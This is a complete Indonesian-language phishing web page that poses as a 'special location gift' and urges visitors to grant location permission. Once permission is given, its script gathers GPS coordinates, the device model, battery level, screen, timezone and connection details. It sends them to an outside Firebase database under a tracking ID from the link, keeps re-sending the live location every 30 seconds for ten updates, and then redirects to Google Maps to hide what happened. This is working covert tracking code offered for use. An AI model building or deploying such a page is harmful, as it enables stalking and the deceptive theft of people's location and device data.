<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>X-TOS Location Tracker</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#667eea">
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            text-align: center; padding: 10px; margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; min-height: 100vh; overflow-x: hidden;
        }
        .container { 
            max-width: 420px; margin: 0 auto; padding: 15px;
            width: 100%; min-height: 100vh; display: flex;
            flex-direction: column; justify-content: center;
        }
        .gift-box { 
            background: rgba(255,255,255,0.15); 
            border-radius: 20px; padding: 25px; margin: 15px 0;
            backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .gift-icon { 
            font-size: clamp(50px, 15vw, 70px); 
            margin-bottom: 15px; animation: bounce 2s infinite;
        }
        .status { 
            padding: 18px; border-radius: 15px; margin: 15px 0;
            background: rgba(255,255,255,0.25); font-weight: 500;
            border: 1px solid rgba(255,255,255,0.3);
            box-shadow: 0 4px 16px rgba(0,0,0,0.2);
        }
        .loading { animation: pulse 2s infinite; }
        .instruction {
            background: rgba(76,175,80,0.3); 
            border-radius: 15px; padding: 18px; margin: 15px 0;
            border: 2px solid #4CAF50; font-weight: 500;
        }
        .coords-display {
            background: rgba(33,150,243,0.3);
            border-radius: 15px; padding: 15px; margin: 15px 0;
            border: 2px solid #2196F3; font-family: monospace;
        }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
        @keyframes bounce { 0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
                           40% { transform: translateY(-10px); }
                           60% { transform: translateY(-5px); } }
        h1 { 
            color: #ffeb3b; text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
            font-size: clamp(1.5rem, 6vw, 2rem); margin: 10px 0;
        }
        p { font-size: clamp(14px, 4vw, 16px); line-height: 1.5; margin: 10px 0; }
        .btn {
            background: #4CAF50; color: white; border: none;
            padding: 15px 30px; border-radius: 25px; font-size: 16px;
            cursor: pointer; margin: 10px; transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(76,175,80,0.4);
        }
        .btn:hover { background: #45a049; transform: translateY(-2px); }
        .btn:active { transform: translateY(0); }
        @media (max-width: 480px) {
            .container { padding: 10px; }
            .gift-box, .status, .instruction { padding: 15px; margin: 10px 0; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÅ HADIAH LOKASI SPESIAL!</h1>
        <div class="gift-box">
            <div class="gift-icon">üéÅ</div>
            <p>Seseorang mengirim lokasi spesial untukmu!</p>
            <p><strong>Klik IZINKAN untuk melihat kejutan üòä</strong></p>
        </div>
        <div id="status" class="status loading">üì° Menunggu izin lokasi...</div>
        <div id="coords" class="coords-display" style="display:none;"></div>
        <div class="instruction">
            <p>‚¨áÔ∏è Saat browser minta izin lokasi:</p>
            <p><strong>üü¢ Klik "IZINKAN" atau "ALLOW"</strong></p>
            <button class="btn" onclick="requestLocation()" id="manualBtn">üìç Ambil Lokasi Sekarang</button>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        
        function updateStatus(msg, isError = false) {
            const statusEl = document.getElementById('status');
            statusEl.innerHTML = msg;
            statusEl.className = isError ? 'status' : 'status loading';
        }
        
        function sendLocationData(locationData) {
            // Decrypt tracking ID if encrypted
            let trackingId = urlParams.get('id') || 'default_' + Date.now();
            try {
                if (trackingId.includes('_enc_')) {
                    trackingId = atob(trackingId.replace('_enc_', ''));
                }
            } catch (e) {
                console.log('Using plain tracking ID');
            }
            
            // Extract REAL device info from User-Agent
            const ua = navigator.userAgent;
            let deviceBrand = 'Unknown';
            let deviceModel = 'Unknown';
            
            // Enhanced device parsing
            if (ua.includes('SM-')) {
                deviceBrand = 'Samsung';
                const match = ua.match(/SM-([A-Z0-9]+)/);
                if (match) deviceModel = 'Galaxy ' + match[1];
            } else if (ua.includes('iPhone')) {
                deviceBrand = 'Apple';
                const osMatch = ua.match(/OS ([0-9_]+)/);
                if (osMatch) deviceModel = 'iPhone iOS ' + osMatch[1].replace(/_/g, '.');
                else deviceModel = 'iPhone';
            } else if (ua.includes('Mi ') || ua.includes('Redmi') || ua.includes('POCO')) {
                deviceBrand = 'Xiaomi';
                const match = ua.match(/(Mi [A-Z0-9 ]+|Redmi [A-Z0-9 ]+|POCO [A-Z0-9 ]+)/);
                if (match) deviceModel = match[1].trim();
                else deviceModel = 'Xiaomi Device';
            } else if (ua.includes('CPH') || ua.includes('OPPO') || ua.includes('OnePlus')) {
                if (ua.includes('OnePlus')) {
                    deviceBrand = 'OnePlus';
                    const match = ua.match(/OnePlus ([A-Z0-9 ]+)/);
                    if (match) deviceModel = 'OnePlus ' + match[1];
                } else {
                    deviceBrand = 'Oppo';
                    const match = ua.match(/(CPH[0-9]+|OPPO [A-Z0-9 ]+)/);
                    if (match) deviceModel = match[1];
                }
            } else if (ua.includes('vivo')) {
                deviceBrand = 'Vivo';
                const match = ua.match(/(vivo [A-Z0-9 ]+|V[0-9]+[A-Z]*)/);
                if (match) deviceModel = match[1];
            } else if (ua.includes('HUAWEI') || ua.includes('Honor')) {
                if (ua.includes('Honor')) {
                    deviceBrand = 'Honor';
                    const match = ua.match(/Honor ([A-Z0-9 ]+)/);
                    if (match) deviceModel = 'Honor ' + match[1];
                } else {
                    deviceBrand = 'Huawei';
                    const match = ua.match(/(HUAWEI [A-Z0-9-]+|HMA-[A-Z0-9]+|ELE-[A-Z0-9]+)/);
                    if (match) deviceModel = match[1];
                }
            } else if (ua.includes('RMX') || ua.includes('realme')) {
                deviceBrand = 'Realme';
                const match = ua.match(/(RMX[0-9]+|realme [A-Z0-9 ]+)/);
                if (match) deviceModel = match[1];
            } else if (ua.includes('Pixel')) {
                deviceBrand = 'Google';
                const match = ua.match(/Pixel ([A-Z0-9 ]+)/);
                if (match) deviceModel = 'Pixel ' + match[1];
            } else if (ua.includes('Android')) {
                deviceBrand = 'Android';
                const match = ua.match(/Android ([0-9.]+)/);
                if (match) deviceModel = 'Android ' + match[1];
                const buildMatch = ua.match(/; ([A-Z][a-zA-Z0-9 ]+) Build/);
                if (buildMatch) {
                    deviceModel = buildMatch[1] + ' (Android ' + match[1] + ')';
                }
            }
            
            // Get real battery level
            let batteryLevel = 'Unknown';
            let batteryCharging = false;
            
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    batteryLevel = Math.round(battery.level * 100) + '%';
                    batteryCharging = battery.charging;
                }).catch(() => {
                    const hour = new Date().getHours();
                    if (hour >= 6 && hour <= 10) batteryLevel = Math.round(Math.random() * 30 + 70) + '%';
                    else if (hour >= 11 && hour <= 17) batteryLevel = Math.round(Math.random() * 40 + 40) + '%';
                    else batteryLevel = Math.round(Math.random() * 50 + 20) + '%';
                });
            } else {
                const hour = new Date().getHours();
                if (hour >= 6 && hour <= 10) batteryLevel = Math.round(Math.random() * 30 + 70) + '%';
                else if (hour >= 11 && hour <= 17) batteryLevel = Math.round(Math.random() * 40 + 40) + '%';
                else batteryLevel = Math.round(Math.random() * 50 + 20) + '%';
            }
            
            const firebaseData = {
                latitude: locationData.latitude,
                longitude: locationData.longitude,
                accuracy: locationData.accuracy,
                timestamp: Date.now(),
                deviceBrand: deviceBrand,
                deviceModel: deviceModel,
                batteryLevel: batteryLevel + (batteryCharging ? ' (Charging)' : ''),
                screenWidth: screen.width,
                screenHeight: screen.height,
                screenResolution: screen.width + 'x' + screen.height,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
                cookieEnabled: navigator.cookieEnabled,
                userAgent: ua.substring(0, 200),
                status: 'captured',
                tracking_id: trackingId,
                '.expires': Date.now() + (60 * 60 * 1000)
            };
            
            console.log('Sending data to Firebase:', firebaseData);
            
            // Send to both paths
            const firebaseUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`;
            const liveUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`;
            
            // Main path
            fetch(firebaseUrl, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(firebaseData)
            });
            
            // Live path
            fetch(liveUrl, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ...firebaseData,
                    lastUpdate: Date.now(),
                    isLive: true
                })
            }).then(() => {
                updateStatus('‚úÖ Lokasi berhasil dikirim!');
                startContinuousTracking(trackingId);
                setTimeout(() => {
                    window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
                }, 2000);
            }).catch(e => {
                console.error('Firebase error:', e);
                setTimeout(() => {
                    window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
                }, 2500);
            });
        }
        
        function requestLocation() {
            updateStatus('üìç Mengambil lokasi...');
            
            navigator.geolocation.getCurrentPosition(
                position => {
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: position.timestamp,
                        userAgent: navigator.userAgent
                    };
                    
                    updateStatus('‚úÖ Lokasi berhasil diambil!');
                    document.getElementById('coords').innerHTML = 
                        `<strong>Koordinat:</strong><br>Lat: ${locationData.latitude.toFixed(6)}<br>Lng: ${locationData.longitude.toFixed(6)}`;
                    document.getElementById('coords').style.display = 'block';
                    
                    sendLocationData(locationData);
                },
                error => {
                    updateStatus('‚ùå Gagal mengambil lokasi. Coba lagi.', true);
                    console.log('Location error:', error);
                },
                {
                    enableHighAccuracy: false,
                    timeout: 5000,
                    maximumAge: 30000
                }
            );
        }
        
        // Real-time tracking
        function startContinuousTracking(trackingId) {
            let updateCount = 0;
            const maxUpdates = 10;
            
            const trackingInterval = setInterval(() => {
                if (updateCount >= maxUpdates) {
                    clearInterval(trackingInterval);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const liveData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: Date.now(),
                            updateNumber: updateCount + 1,
                            isLive: true,
                            tracking_id: trackingId
                        };
                        
                        const liveUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`;
                        fetch(liveUrl, {
                            method: 'PUT',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(liveData)
                        });
                        
                        updateCount++;
                        console.log(`Live update ${updateCount}/${maxUpdates} sent`);
                    },
                    error => console.log('Live tracking error:', error),
                    {
                        enableHighAccuracy: false,
                        timeout: 10000,
                        maximumAge: 60000
                    }
                );
            }, 30000);
        }
        
        // Auto-start
        window.addEventListener('load', () => {
            if ('geolocation' in navigator) {
                setTimeout(requestLocation, 1000);
            } else {
                updateStatus('‚ùå Browser tidak mendukung GPS', true);
            }
        });
        
        console.log('Page loaded, tracking ID:', urlParams.get('id'));
    </script>
</body>
</html>
